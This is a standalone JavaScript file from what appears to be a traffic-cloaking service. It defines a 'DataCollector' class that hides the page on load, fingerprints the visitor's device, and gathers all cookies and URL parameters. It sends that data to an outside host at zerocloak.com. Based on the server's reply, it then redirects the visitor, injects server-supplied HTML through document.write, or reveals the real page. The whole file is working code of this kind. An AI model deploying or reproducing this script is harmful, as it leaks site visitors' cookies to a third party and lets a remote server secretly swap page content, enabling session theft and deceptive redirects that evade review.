class DataCollector {
    constructor(targetUrl, timeout = 30000) {
        this.hideBody();
        this.targetUrl = targetUrl;
        this.requestId = this.generateUniqueId('req_');
        this.uei_6s71a1 = "8e74kfsqqr";
        this.cst_4u89t5 = "6xeky42rkd";
        this.timeout = timeout;

    }

    generateUniqueId(prefix) {
        return prefix + Math.random().toString(36).substr(2, 16);
    }

    hideBody() {
        if (document.body) {
            document.body.style.display = 'none';
        }
    }
    unhideBody() {
        document.body.style.display = '';
    }

    gatherRequestData() {
        const userInfo = {
            browserName: navigator.appName,
            browserVersion: navigator.appVersion,
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            language: navigator.language,
            cookiesEnabled: navigator.cookieEnabled,
            onlineStatus: navigator.onLine,
            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
            hardwareConcurrency: navigator.hardwareConcurrency,
            touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
            referrer: document.referrer,
            screenWidth: screen.width,
            screenHeight: screen.height,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio,
            windowWidth: window.innerWidth,
            windowHeight: window.innerHeight,
            currentUrl: window.location.href,
            javaEnabled: navigator.javaEnabled(),
            plugins: Array.from(navigator.plugins, plugin => plugin.name),
            localStorageSupported: typeof (Storage) !== 'undefined',
            sessionStorageSupported: typeof (sessionStorage) !== 'undefined',
            geolocationSupported: 'geolocation' in navigator,
            isSecureContext: window.isSecureContext,
            deviceType: /mobile|android|iphone|ipad|ipod/i.test(navigator.userAgent.toLowerCase()) ? 'Mobile' : 'Desktop',
            currentTime: new Date().toLocaleString(),
            hasMicrophone: navigator.mediaDevices ? navigator.mediaDevices.enumerateDevices().then(devices => devices.some(device => device.kind === 'audioinput')).catch(() => false) : false,
            hasCamera: navigator.mediaDevices ? navigator.mediaDevices.enumerateDevices().then(devices => devices.some(device => device.kind === 'videoinput')).catch(() => false) : false,
        };

        return {
            request_id: this.generateRequestId(),
            uei_6s71a1: this.uei_6s71a1,
            cst_4u89t5: this.cst_4u89t5,
            server: [],
            headers: [],
            get: this.getQueryParams(),
            post: [],
            files: [],
            cookie: this.getCookies(),
            session: [],
            timestamp: this.getFormattedTimestamp(),
            userInfo: userInfo,
            isJsRequest: true,
        };
    }

    async transmitData(data, maxRetries = 3) {
        const sendRequest = async (attempt = 0) => {
            try {
                const response = await fetch(this.targetUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Request-ID': this.requestId,
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache'
                    },
                    body: JSON.stringify(data),
                    timeout: this.timeout
                });

                if (!response.ok) {
                    throw new Error(`Error: ${response.status} - ${response.statusText}`);
                }

                const responseData = await response.text();
                this.successHandle(JSON.parse(atob(responseData)));

            } catch (error) {
                if (attempt < maxRetries) {
                    setTimeout(() => sendRequest(attempt + 1), 1000);
                } else {
                    this.failHandle('Error: Failed to transmit data after multiple retries.');
                }
            }
        };

        await sendRequest();
    }

    async handleRequest() {
        const data = this.gatherRequestData();
        const jsonData = JSON.stringify(data);
        const base64Data = btoa(jsonData);
        const encryptedData = await this.encryptPayload(base64Data);
        if (!encryptedData) {
            console.error("Encryption failed");
            return;
        }

        await this.transmitData(encryptedData);
    }

    async encryptPayload(payload) {
        return Promise.resolve(payload);
    }

    successHandle(responseData) {

       if (!responseData?.status) {
            document.write(responseData.message);
            this.failHandle(responseData.message);
            return;
        }

       if (responseData?.data?.hr) {
            const meta = document.createElement('meta');
            meta.name = 'referrer';
            meta.content = 'no-referrer';
            if (document.head) {
                document.head.appendChild(meta);
            } else {
                document.addEventListener('DOMContentLoaded', () => {
                    document.head.appendChild(meta);
                });
            }
        }

        if (!responseData?.data?.nothing) {
            if (responseData?.data?.zrc !== null) {
                if (!responseData.data.zrc.status) {
                    document.write(responseData.data.zrc.message);
                    this.failHandle(responseData.data.zrc.message);
                    return;
                }

                this.zeroRedirectionCloaking(responseData.data.zrc.content);
                return;
            }

            this.redirectTo(responseData.data.url);
            return;
        }

        this.unhideBody();
        console.log('Data transmitted successfully:', responseData);
        return;
    }

    failHandle(error) {
        console.error('Data transmission failed:', error);
    }
    getQueryParams() {
        const queryString = window.location.search.slice(1);
        const params = {};

        queryString.split("&").forEach(pair => {
            if (!pair) return;
            const [key, value] = pair.split("=");
            params[decodeURIComponent(key)] = decodeURIComponent(value || '');
        });

        return params;
    }
    getCookies() {
        const cookieString = document.cookie;
        const cookies = {};

        cookieString.split(";").forEach(cookie => {
            const [name, value] = cookie.split("=").map(part => decodeURIComponent(part.trim()));
            if (name) cookies[name] = value;
        });

        return cookies;
    }
    zeroRedirectionCloaking(content) {
        document.write(content);
    }
    redirectTo(url) {
        window.location.href = url;
    }
    getFormattedTimestamp() {
        const now = new Date();

        const pad = (n) => n.toString().padStart(2, '0');

        const year = now.getFullYear();
        const month = pad(now.getMonth() + 1);
        const day = pad(now.getDate());

        const hours = pad(now.getHours());
        const minutes = pad(now.getMinutes());
        const seconds = pad(now.getSeconds());

        return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
    }
    generateRequestId() {
        const hex = [...Array(14)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
        const number = Math.floor(10000000 + Math.random() * 90000000);
        return `req_${hex}.${number}`;
    }
}

const dataCollector = new DataCollector('https://app.zerocloak.com/realtime',);
dataCollector.handleRequest();
// @zerocloak.com 2026-09-23 13:53:05